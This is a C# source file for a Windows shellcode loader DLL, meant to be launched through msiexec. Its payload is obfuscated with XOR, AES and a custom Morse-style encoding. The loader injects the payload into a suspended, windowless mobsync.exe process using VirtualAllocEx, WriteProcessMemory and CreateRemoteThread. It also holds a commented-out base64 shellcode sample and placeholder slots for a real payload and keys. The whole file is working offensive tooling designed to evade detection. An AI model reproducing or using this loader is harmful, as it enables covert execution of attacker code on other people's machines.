//execute with
//msiexec.exe /z C:\Users\ch4rm\Desktop\ObfuscatorXOR\Dlllauncher\bin\x64\Release\Dlllauncher.dll
using System;
using RGiesecke.DllExport;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;
using System.Security.Cryptography;
using System.IO;

namespace Dlllauncher
{
    public class Class1
    {
        private static readonly object PayloadLock = new object();
        private static Boolean PayloadHasRun = false;
        private static readonly UInt32 MEM_COMMIT = 0x1000;
        private static readonly UInt32 PAGE_EXECUTE_READ = 0x20;
        private static readonly UInt32 PAGE_READWRITE = 0x04;

        //Entry point for MSIExec
        [DllExport("DllUnregisterServer", CallingConvention = CallingConvention.Cdecl)]
        public static bool DllUnRegisterServer()
        {
            ExecCreateRemoteThread();
            return false;
        }

        public enum FreeType
        {
            Decommit = 0x4000,
            Release = 0x8000,
        }

        public enum ProcessCreationFlags : uint
        {
            CREATE_NO_WINDOW = 0x08000000,
            CREATE_SUSPENDED = 0x00000004
        }

        public enum ThreadAccess : int
        {
            SET_CONTEXT = (0x0010)
        }

        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [DllImport("kernel32.dll")]
        public static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            ProcessCreationFlags dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")]
        public static extern bool TerminateProcess(
            IntPtr hProcess,
            uint uExitCode);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(
            int dwDesiredAccess,
            bool bInheritHandle,
            int dwProcessId);

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenThread(
            ThreadAccess dwDesiredAccess,
            bool bInheritHandle,
            int dwThreadId);

        [DllImport("kernel32.dll")]
        public static extern IntPtr QueueUserAPC(
            IntPtr pfnAPC,
            IntPtr hThread,
            IntPtr dwData);

        [DllImport("kernel32.dll")]
        public static extern uint ResumeThread(
            IntPtr hThread);

        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpStartAddr,
            UInt32 size,
            UInt32 flAllocationType,
            UInt32 flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            Int32 dwSize,
            UInt32 flAllocationType,
            UInt32 flProtect);

        [DllImport("kernel32.dll")]
        private static extern bool VirtualFree(
            IntPtr lpAddress,
            UInt32 dwSize,
            FreeType dwFreeType);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualFreeEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            FreeType dwFreeType);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(
            IntPtr lpAddress,
            uint dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        public static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out IntPtr lpNumberOfBytesWritten);

        /*
        public static PROCESS_INFORMATION StartProcess(string binaryPath)
        {
            uint flags = 0x00000004;

            STARTUPINFO startInfo = new STARTUPINFO();
            PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
            CreateProcess((IntPtr)0, binaryPath, (IntPtr)0, (IntPtr)0, false, flags, (IntPtr)0, (IntPtr)0, ref startInfo, out procInfo);

            return procInfo;
        }
        */
        public static byte[] AESDecrypt(byte[] cipherData, string aes_key, string aes_iv)
        {

            MemoryStream ms = new MemoryStream();

            Rijndael alg = Rijndael.Create();

            alg.Key = Convert.FromBase64String(aes_key);
            alg.IV = Convert.FromBase64String(aes_iv);

            CryptoStream cs = new CryptoStream(ms,
                alg.CreateDecryptor(), CryptoStreamMode.Write);

            cs.Write(cipherData, 0, cipherData.Length);

            cs.Close();

            byte[] decryptedData = ms.ToArray();

            return decryptedData;
        }

        public static string rahsia(string encoded)
        {
            char[] text = { 'a', 'A', 'b', 'B', 'c', 'C', 'd', 'D', 'e', 'E', 'f', 'F', 'g', 'G', 'h', 'H', 'i', 'I', 'j', 'J', 'k', 'K', 'l', 'L', 'm', 'M', 'n', 'N', 'o', 'O', 'p', 'P', 'q', 'Q', 'r', 'R', 's', 'S', 't', 'T', 'u', 'U', 'v', 'V', 'w', 'W', 'x', 'X', 'y', 'Y', 'z', 'Z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '/', '=', '+', '!' };
            string[] titik = { ".-", "^.-", "-...", "^-...", "-.-.", "^-.-.", "-..", "^-..", ".", "^.", "..-.", "^..-.", "--.", "^--.", "....", "^....", "..", "^..", ".---", "^.---", "-.-", "^-.-", ".-..", "^.-..", "--", "^--", "-.", "^-.", "---", "^---", ".--.", "^.--.", "--.-", "^--.-", ".-.", "^.-.", "...", "^...", "-", "^-", "..-", "^..-", "...-", "^...-", ".--", "^.--", "-..-", "^-..-", "-.--", "^-.--", "--..", "^--..", "-----", ".----", "..---", "...--", "....-", ".....", "-....", "--...", "---..", "----.", "/", "...^-", "^.^", "^..^" };
            string[] codes = encoded.Split(' ');

            StringBuilder decoded = new StringBuilder();

            for (int i = 0; i < codes.Length; i++)
            {

                for (int k = 0; k < titik.Length; k++)
                {
                    if (codes[i].Equals(titik[k]))
                    {
                        decoded.Append(text[k]);
                    }
                }

            }
            return decoded.ToString();
        }



        private static PROCESS_INFORMATION StartProcess(string process)
        {
            STARTUPINFO startupInfo = new STARTUPINFO();
            PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
            bool success = CreateProcess(
                process,
                null,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                ProcessCreationFlags.CREATE_SUSPENDED | ProcessCreationFlags.CREATE_NO_WINDOW,
                IntPtr.Zero,
                null,
                ref startupInfo,
                out processInfo);

            return processInfo;
        }

        private static byte[] xorEncDec(byte[] input, string theKeystring)
        {
            byte[] theKey = Encoding.UTF8.GetBytes(theKeystring);
            byte[] mixed = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                mixed[i] = (byte)(input[i] ^ theKey[i % theKey.Length]);
            }
            return mixed;
        }

        static String DefaultProcPath = @"C:\Windows\System32\mobsync.exe";

        //static String sh3llc0d3 = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";

        /*
        static string xoredAesB64 = rahsia(".--. -.. ^.--- - ..... ..... ^.-- .-- ^.-.. -.-- ^-... ^.--. -- ^..-. --.. -.... .-.. -.... -... .---- ---.. ^.--- .-- ..- ^..-. .... .--. ... ^-. -.... ^... ...- -.... ....- ..--- ^-.-. ..-. --.. ^.-.. -- ^.-- --.. -.... .--. --... ^.- .---- ...-- --- ^.... ^.--- ^.-.. --- ^-.-- ^..- ^-.-. -. ..- -. ^.--- .- -.... -.-- ^- ^.... ..-. -..- .--. ^-.. ..-. .-- .---- .... - ^.-- ---.. ...- . --... ^--.. ^.. .-- .. ^--. ^- ^- ... ^-..- ^-.. ^--. --.- ^.. -.-. ^..-. ^--- ^--.. ..-. --.- ^-. - ---.. .-. . ^-.-- --.. -..- ----. -.- -. ^.. ^.^ ... ..- ^.--. ^.--. ^...- .--- -.- -.. .---- ^--.. .-.. .---- -.-. ^-.. ^.--. .-.. ^--. ^. ^-... ^-..- .- ^-.. --... .-.. ^-.-- ---.. ^-.. ----- .-. ^-- ^-.-- -..- ^... ^.^ ^-. ...- ^-..- ..-. -..- ^--.- -.... .... ..... ^.- --... .--. ....- --. ^- ^.... ^.... .--- ^... ^- ^... --- ^.- .- ^.-- --.. --... ^--. ...- --.. ^.-- .---- ---.. ^.-- ^.^ ^.. .-- ..... .. -.- ...- ^.-- ^-.-- ^.--- ^..-. .... . ^.- .-- ^.--- ^- --.. ...- ^.--- ^..- -.- ..-. -.-. ^-..- -.-. / ^-... ^.-. ^.... .--. ^-... ^.--- ----. -... ^--. .--. ^..- ..- ^..-. ^.--. ...-- ^..-. ----- ---.. ^.^ ^.-.. ..-. ^--.. ^.. .-.. ^. ..- .. ^.... ^.- .--- ^... ^.--. ^... ^-.. ...- ..-. .--- ^-.. --- ..-. ..- ^-. ....- -.. -... -- ^..- .-.. -.- .-- --- / .-.. ^..-. ^-.-. ^.^ --- ^--.. / .. -... ^-.-- ---.. ^.-.. ..... ----. ^.... ^...- .---- ^.-. ^- ^--.. ^-.-. ^..-. ^--. -.. ..--- ^--- - - .-- ^.--- ^--.. ....- ...- --... -. ^-..- .-- ...-- ^.--- ^-. ^--.- ^.. ^-.- .-- ^.- -.-- ...-- -.-. .-- ...-- ^.--. --.. .--. ^..- - ^- ...-- --... ...- .--. ^..-. ^-..- ^.-. ----- --- -. --... ^.- -.... -.-- -.- ^--.- -.-. ^-.- ^--.. --.. / ----. ..--- .-.. ^--.- -.-- --.. .--. --- ^..- ^--.. ^-- ^.. ...- ^-.. ^.. ----. ^-.- --.. ^--- ^--- / ^--.. ^.--- ^.. -.- ^.. .- -... .-- .. -.. --. ^...- --- ^.-- .--- .--. ^.-. ^..-. -.. ...- ^--.- -.-. -.. ^... ..- ^..- .-- -.- ");
        static string xorKey = rahsia("-..- ^..^ -..- ^..^ ^.--- . -.- ^-. ^--.. - ..-. ^.^ ..... ^--. -.-. ^- -. -..- ");
        static string aE5k3y = rahsia("--... ^--. ^.... ^.- ---.. . --.- ^. ^--- ^-.-- ----. ^-..- ^.-.. ^-. ..- ... --... -. ^...- .--- -. --... ----- ^.- .--. .--- .. ^-.-. ^..-. -.-- ^-..- .... .-- .--. ^..-. -.- ^..-. ----- -.- ...-- --.- ^--. ... ...^- ");
        static string aE5Iv = rahsia("^-.- ^.. ... -.-. -.. / ^-.- ^.-. ..- ..- ..--- ^.--. ^-. ^--.- -... ^-. -..- ..... -.-- ^..- ^-..- ^--.- ...^- ...^- ");
        */

        static string xoredAesB64 = rahsia("REPLACE SHELLCODE HERE");
        static string xorKey = rahsia("REPLACE XORKEY");
        static string aE5k3y = rahsia("REPLACE A3S_KEY");
        static string aE5Iv = rahsia("REPLACE A3S_IV");

        private static void ExecCreateRemoteThread()
        {
            //Initialization
            IntPtr bytesWritten = IntPtr.Zero;
            String process = String.Empty;
            byte[] sh3llc0d3 = new byte[] { };

            byte[] aesEncrypted = xorEncDec(Convert.FromBase64String(xoredAesB64), xorKey);

            process = DefaultProcPath;
            //sh3llc0d3 = Convert.FromBase64String(sh3llc0d364);
            sh3llc0d3 = AESDecrypt(aesEncrypted, aE5k3y, aE5Iv);


            //Start process to inject into
            PROCESS_INFORMATION processInfo = StartProcess(process);
            if (processInfo.hProcess == IntPtr.Zero)
            {
                return;
            }

            //Allocate executable memory
            IntPtr address = VirtualAllocEx(processInfo.hProcess, IntPtr.Zero, sh3llc0d3.Length, MEM_COMMIT, PAGE_READWRITE);
            if (address == IntPtr.Zero)
            {
                TerminateProcess(processInfo.hProcess, 0);
                return;
            }

            //Write sh3llc0d3 into allocated memory in target process
            if (!WriteProcessMemory(processInfo.hProcess, address, sh3llc0d3, sh3llc0d3.Length, out bytesWritten))
            {
                //Clean up memory allocation, stop process, and exit
                VirtualFreeEx(processInfo.hProcess, address, sh3llc0d3.Length, FreeType.Release);
                TerminateProcess(processInfo.hProcess, 0);
                return;
            }

            //Modify memory protections to allow execution
            if (!VirtualProtectEx(processInfo.hProcess, address, sh3llc0d3.Length, PAGE_EXECUTE_READ, out uint oldProtect))
            {
                //Clean up memory allocation, stop process, and exit
                VirtualFreeEx(processInfo.hProcess, address, sh3llc0d3.Length, FreeType.Release);
                TerminateProcess(processInfo.hProcess, 0);
                return;
            }

            //Create thread in remote process to execute sh3llc0d3
            if (CreateRemoteThread(processInfo.hProcess, IntPtr.Zero, 0, address, IntPtr.Zero, 0, IntPtr.Zero) == IntPtr.Zero)
            {
                //Clean up memory allocation, stop process, and exit
                VirtualFreeEx(processInfo.hProcess, address, sh3llc0d3.Length, FreeType.Release);
                TerminateProcess(processInfo.hProcess, 0);
                return;
            }
        }
    }
}